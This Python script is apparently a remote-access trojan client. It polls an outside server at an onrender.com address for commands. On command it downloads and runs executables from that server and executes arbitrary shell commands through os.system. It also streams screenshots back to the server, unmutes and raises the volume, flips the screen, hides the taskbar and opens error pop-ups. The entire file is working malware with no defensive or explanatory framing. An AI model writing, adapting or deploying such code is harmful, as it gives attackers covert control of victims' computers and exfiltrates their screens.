import requests as rq
from time import sleep
from threading import Thread
from webbrowser import open as wbopen
import pygame
import os
import pyttsx3
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from comtypes import CLSCTX_ALL, CoInitialize, CoUninitialize
from shutil import rmtree
import rotatescreen as rs
from pyautogui import screenshot
from io import BytesIO 

url = "https://ms32-sha2.onrender.com/"
screen = rs.get_primary_display()
terminate = False
sstate = False
sharing = False
user = "03"
try:
    pygame.mixer.init()
except:
    try:
        statement = f"WARN   no speaker detected, no audio will play"
        rq.post(url+"output",data={"user":user,"err":statement})
    except:
        pass
              
if not os.path.exists("effects"):
    os.mkdir("effects")
if not os.path.exists("assets"):
    os.mkdir("assets")

def hit(url:str,data=None):
    try:
        if not terminate:
            if data:
                return rq.post(url,json=data)
            return rq.get(url,stream=True)
    except:
        return "none"

def log(statement,state="SUCESS"):
    try:
        statement = f"{state}   {statement}"
        hit(url+"output",data={"user":user,"err":statement})
    except:
        pass

def say(txt):
    try:
        engine = pyttsx3.init()
        engine.setProperty("rate",engine.getProperty('rate')-40)
        engine.say(txt)
        log(f"Played {txt}")
        engine.runAndWait()
    except Exception as e:
        log(f"pyttsx3 thread error:\t{e}",state="WARN")

def playfunc(fp):
    try:
        if not os.path.exists(os.path.join("effects",fp)):
            audi = hit(url+f"static/sounds/{fp}")
            try:
                kp = type(audi.content.decode("utf-8"))
                log(f"Likely error. recieved content for {fp} is {kp}")
            except Exception as e:
                log(f"DOwnloaded {fp}")
            with open(os.path.join("effects",fp), "xb") as file:
                downloaded_size = 0
                for chunk in audi.iter_content(chunk_size=8192):
                    if chunk:
                        file.write(chunk)
                        downloaded_size += len(chunk)
        # try:                
        CoInitialize()
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume.iid, CLSCTX_ALL, None)
        volume = interface.QueryInterface(IAudioEndpointVolume)
        
        if volume.GetMute():
            volume.SetMute(0, None)
        log("Unmuted")
        vmin, vmax, _ = volume.GetVolumeRange()
        target = vmin + (95 / 100.0) * (vmax - vmin)
        target = max(min(target, vmax), vmin)
        volume.SetMasterVolumeLevel(target, None)
        # except:
        #     pass
        CoUninitialize()
        log("Vol set to 80")
        pygame.mixer.music.load(f"effects/{fp}")
        log(f"Playing {fp}")
        pygame.mixer.music.play()
        while pygame.mixer.music.get_busy():
            continue               
        log(f"Done Played {fp}")
    except Exception as e:
        log(f"Audio thread error: \t{e}",state="WARN")
def update():
    try:
        global terminate
        exe = hit(url+"static/updates/ms32-1.exe")
        try:
            kp = type(exe.content.decode("utf-8"))
            log(f"Likely error. recieved content for ms32-1.exe is {kp}")
        except Exception as e:
            log(f"DOwnloaded ms32-1.exe")
        total_size = int(exe.headers.get('content-length', 0))
        with open("ms32-1.exe", "xb") as file:
            downloaded_size = 0
            for chunk in exe.iter_content(chunk_size=8192):
                if chunk:
                    file.write(chunk)
                    downloaded_size += len(chunk)
        exe = hit(url+"static/updates/updater.exe")
        try:
            kp = type(exe.content.decode("utf-8"))
            log(f"Likely error. recieved content for updater.exe is {kp}")
        except Exception as e:
            log(f"DOwnloaded updater.exe")
        with open("updater.exe", "wb") as file:
            downloaded_size = 0
            for chunk in exe.iter_content(chunk_size=8192):
                if chunk:
                    file.write(chunk)
                    downloaded_size += len(chunk)
        os.startfile("updater.exe")
        log("Updating ms32.exe")
        terminate=True
        return
    except Exception as e:
        log(f"Updating thread error: \t{e}",state="WARN")


def hide(state):
    try:
        if state:
            if not os.path.exists("hide.exe"):
                exe = hit(url+"static/updates/hide.exe")
                try:
                    kp = type(exe.content.decode("utf-8"))
                    log(f"Likely error. recieved content for hide.exe is {kp}")
                except Exception as e:
                    log(f"DOwnloaded hide.exe")
                with open("hide.exe", "xb") as file:
                    downloaded_size = 0
                    for chunk in exe.iter_content(chunk_size=8192):
                        if chunk:
                            file.write(chunk)
                            downloaded_size += len(chunk)
            os.startfile("hide.exe")
            log("Taskbar hidden")
        else:
            if not os.path.exists("show.exe"):
                exe = hit(url+"static/updates/show.exe")
                try:
                    kp = type(exe.content.decode("utf-8"))
                    log(f"Likely error. recieved content for show.exe is {kp}")
                except Exception as e:
                    log(f"DOwnloaded show.exe")
                with open("show.exe", "xb") as file:
                    downloaded_size = 0
                    for chunk in exe.iter_content(chunk_size=8192):
                        if chunk:
                            file.write(chunk)
                            downloaded_size += len(chunk)
            os.startfile("show.exe")
            log("Taskbar Unhidden")
    except Exception as e:
        log(f"hide/show thread error occured:\t{e}",state="WARN")

def restart():
    try:
        global terminate
        if not os.path.exists("restart.exe"):
            exe = hit(url+"static/updates/restart.exe")
            try:
                kp = type(exe.content.decode("utf-8"))
                log(f"Likely error. recieved content for restart.exe is {kp}")
            except Exception as e:
                log(f"DOwnloaded restart.exe")
            with open("restart.exe", "xb") as file:
                downloaded_size = 0
                for chunk in exe.iter_content(chunk_size=8192):
                    if chunk:
                        file.write(chunk)
                        downloaded_size += len(chunk) 
        os.startfile("restart.exe")
        log("Restarting...")
        terminate = True
    
    except Exception as e:
        log(f"Restart occured:\t{e}",state="WARN")

def run(name):
    try:
        if os.path.exists(name):
            os.remove(name)
        exe = hit(url+f"static/apps/{name}")
        try:
            kp = type(exe.content.decode("utf-8"))
            log(f"Likely error. recieved content for {name} is {kp}")
        except Exception as e:
            log(f"DOwnloaded {name}")
        with open(name, "xb") as file:
            downloaded_size = 0
            for chunk in exe.iter_content(chunk_size=8192):
                if chunk:
                    file.write(chunk)
                    downloaded_size += len(chunk)
        log(f"Running {name}")
        os.startfile(name)
        log(f"Done Running {name}")
    except Exception as e:
        log(f"Run thread error occured:\t{e}",state="WARN")

def display(fp:str):
    try:
        asset = hit(url+f"static/images/{fp}")
        try:
            kp = type(asset.content.decode("utf-8"))
            log(f"Likely error. recieved content for {fp} is {kp}")
        except Exception as e:
            log(f"DOwnloaded {fp}")
        ext = fp.split(".")[1]
        if os.path.exists("assets"):
            rmtree("assets")
            log("removed assets folder")
        os.mkdir("assets")
        with open(f"assets/sample.{ext}", "xb") as file:
            downloaded_size = 0
            for chunk in asset.iter_content(chunk_size=8192):
                if chunk:
                    file.write(chunk)
                    downloaded_size += len(chunk)
        try:
            exe = hit(url+f"static/apps/imshow.exe")
            try:
                kp = type(exe.content.decode("utf-8"))
                log(f"Likely error. recieved content for imshow.exe is {kp}")
            except Exception as e:
                log(f"DOwnloaded imshow.exe")
            with open("imshow.exe", "xb") as file:
                downloaded_size = 0
                for chunk in exe.iter_content(chunk_size=8192):
                    if chunk:
                        file.write(chunk)
                        downloaded_size += len(chunk)
        except FileExistsError:
            exe = hit(url+f"static/apps/imshow.exe")
            try:
                kp = type(exe.content.decode("utf-8"))
                log(f"Likely error. recieved content for imshow.exe is {kp}")
            except Exception as e:
                log(f"DOwnloaded imshow.exe")
            with open("imshow.exe", "wb") as file:
                downloaded_size = 0
                for chunk in exe.iter_content(chunk_size=8192):
                    if chunk:
                        file.write(chunk)
                        downloaded_size += len(chunk)
        os.startfile("imshow.exe")
        log("Started imshow.exe, llikely image showing")
    except Exception as e:
        log(f"Display thread error occured:\t{e}",state="WARN")
def flip():
    global sstate
    try:
        log("Flipping")
        while sstate:
            screen.set_portrait()
            sleep(1)
            screen.set_landscape_flipped()
            sleep(1)
            screen.set_portrait_flipped()
            sleep(1)
            screen.set_landscape()
            sleep(1)
    except Exception as e:
        log(f"flip thread error occured:\t{e}",state="WARN")

def runcmd(cmd):
    try:
        os.system(cmd)
        return True
    except Exception as e:
        log(f"runcmd thread error:\t{e}",state="WARN")
def showerr(num):
    try:
        if not os.path.exists("error.exe"):
            exe = hit(url+f"static/apps/error.exe")
            try:
                kp = type(exe.content.decode("utf-8"))
                log(f"Likely error. recieved content for error.exe is {kp}")
            except Exception as e:
                log(f"DOwnloaded error.exe")
            with open("error.exe", "xb") as file:
                    downloaded_size = 0
                    for chunk in exe.iter_content(chunk_size=8192):
                        if chunk:
                            file.write(chunk)
                            downloaded_size += len(chunk)
        for _ in range(1,int(num)+1):
            os.startfile("error.exe")
    except Exception as e:
        log(f"showerr thread error:\t{e}",state="WARN")

def share():
    global sharing
    while sharing:
        try:
            ss = screenshot()
            img_byte_arr = BytesIO()
            ss.save(img_byte_arr, format='JPEG')
            img_byte_arr = img_byte_arr.getvalue()
            files = {'image': ('screenshot.jpg', img_byte_arr, 'image/jpeg')}
            rq.post(url+"screenshot", files=files)
        except Exception as e:
            log(f"share thread error:\t{e}",state="WARN")
def main():
    global sstate
    global sharing
    log(f"{user} online!", state="ONLINE")
    while not terminate:
        try:
            sleep(0.5)
            cmd = hit(url+"command",data={"user":user})
            if type(cmd) != str:
                cmd = cmd.content.decode("utf-8")
            print(cmd)
            if "hIdE on" in cmd:
                Thread(target=hide,args=(True,)).start()
            elif "hIdE off" in cmd:
                Thread(target=hide,args=(False,)).start()
            elif "rEsTaRt" in cmd:
                restart()
            elif "oPeN" in cmd:
                link = cmd.replace("oPeN ","")
                link = link.replace("sPeAk","") if "sPeAk" in link else link
                wbopen(link)
                log(f"Opened {link}")
            elif "pLaY" in cmd:
                fp = cmd.replace("pLaY ","")
                fp = fp.replace("sPeAk","") if "sPeAk" in fp else fp
                Thread(target=playfunc,args=(fp,)).start()
            elif "uPdAtE" in cmd:
                update()
            elif "rUn" in cmd:
                app_name = cmd.replace("rUn ","")
                app_name = app_name.replace("sPeAk","") if "sPeAk" in app_name else app_name
                Thread(target=run,args=(app_name,)).start()
            elif "iMaGe" in cmd:
                ifp = cmd.replace("iMaGe ","")
                ifp = ifp.replace("sPeAk","") if "sPeAk" in ifp else ifp
                Thread(target=display,args=(ifp,)).start()
            elif "fLiP on" in cmd:
                sstate = True
                Thread(target=flip).start()
            elif "fLiP off" in cmd:
                sstate = False
                screen.set_landscape()
                log("flip off")
            elif "cMd" in cmd:
                cmd = cmd.replace("cMd ","")
                cmd = cmd.replace("sPeAk","") if "sPeAk" in cmd else cmd
                Thread(target=runcmd,args=(cmd,)).start()
            elif "eRr" in cmd:
                cmd = cmd.replace("eRr ","")
                cmd = cmd.replace("sPeAk","") if "sPeAk" in cmd else cmd
                Thread(target=showerr,args=(cmd,)).start()
            elif "sHaRe on" in cmd:
                sharing = True
                Thread(target=share).start()
            elif "sHaRe off" in cmd:
                sharing = False
            elif "sPeAk" in cmd:
                txt = cmd.replace("sPeAk","")
                saying = Thread(target=say,args=(txt,))
                saying.start()
        except Exception as e:
            log(f"Main thread error occured:\t{e}",state="WARN")
    log("Shutting down",state="OFFLINE")

main()